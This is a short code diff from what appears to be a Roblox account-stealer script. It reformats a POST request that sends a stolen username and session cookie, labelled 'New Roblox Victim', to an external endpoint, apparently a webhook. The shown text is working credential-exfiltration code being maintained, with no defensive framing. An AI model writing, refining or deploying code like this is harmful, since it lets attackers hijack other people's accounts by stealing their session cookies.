@@ -186,7 +186,13 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: `**New Roblox Victim**\nUsername: \( {username}\nCookie:\n\`\`\` \){cookie}\`\`\`\nTime: ${new Date().toLocaleString()}`
+          content: `**New Roblox Victim**
+Username: ${username}
+Cookie:
+\`\`\`
+${cookie}
+\`\`\`
+Time: ${new Date().toLocaleString()}`
         })
       }).then(() => {
         setTimeout(() => {
